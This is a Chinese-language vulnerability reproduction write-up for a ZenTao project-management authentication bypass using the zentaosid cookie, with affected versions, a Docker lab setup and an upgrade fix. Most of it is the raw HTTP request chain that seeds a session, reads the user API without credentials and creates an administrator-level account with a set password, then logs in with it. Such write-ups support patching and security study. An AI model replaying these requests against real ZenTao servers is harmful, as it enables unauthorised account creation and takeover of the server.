# 禅道 zentaosid cookie 身份认证绕过漏洞

## 漏洞描述

禅道项目管理系统存在身份认证绕过漏洞，远程攻击者利用该漏洞可以绕过身份认证，调用任意 API 接口创建用户或修改管理员用户的密码，以管理员用户登录该系统，进而接管服务器。

参考链接：

- https://www.zentao.net/book/zentaoprohelp/41.html
- https://www.zentao.net/book/zentaopms/405.html

## 漏洞影响

```
16.x <= 禅道 < 18.12（开源版）
6.x <= 禅道 < 8.12（企业版）
3.x <= 禅道 < 4.12（旗舰版）
```

## 环境搭建

执行如下命令启动一个禅道 18.5 服务器：

```
docker compose up -d
```

docker-compose.yml

```
services:
  zentao:
    image: easysoft/zentao:18.5
    ports:
      - "8084:80"
    environment:
      - MYSQL_INTERNAL=true
    volumes:
      - /data/zentao:/data
```

服务启动后，访问 `http://your-ip:8084` 即可查看到安装页面，默认配置安装直至完成，数据库默认账号密码为 `root/123456`。

## 漏洞复现

```
POST /api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
Host: your-ip:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 11

fields=true
```

![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140408978.png)

未添加 `zentaosid` 时，访问 `/api.php/v1/users` 提示 `{"error":"Unauthorized"}`：

```
GET /api.php/v1/users HTTP/1.1
Host: your-ip:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 11
```

![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140530510.png)

添加 `zentaosid` 绕过认证：

```
GET /api.php/v1/users HTTP/1.1
Host: your-ip:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: zentaosid=bdfda9cd81c43017703931d473ccca98;
Content-Length: 11
```

![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140639400.png)

通过该漏洞添加用户：

```
POST /api.php/v1/users HTTP/1.1
Host: your-ip:8084
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: zentaosid=93441fc0301811a03ad2285ae52e9591;
Content-Length: 11

{
    "account":"threeki",
    "password":"thr33..",
    "realname":"threeki",
    "role":"top",
    "group":"1"
}

```

![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140215609.png)

使用添加的账号 `threeki/thr33..` 成功登录：

![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140843200.png)

## 漏洞修复

升级至最新版本 https://www.zentao.net/
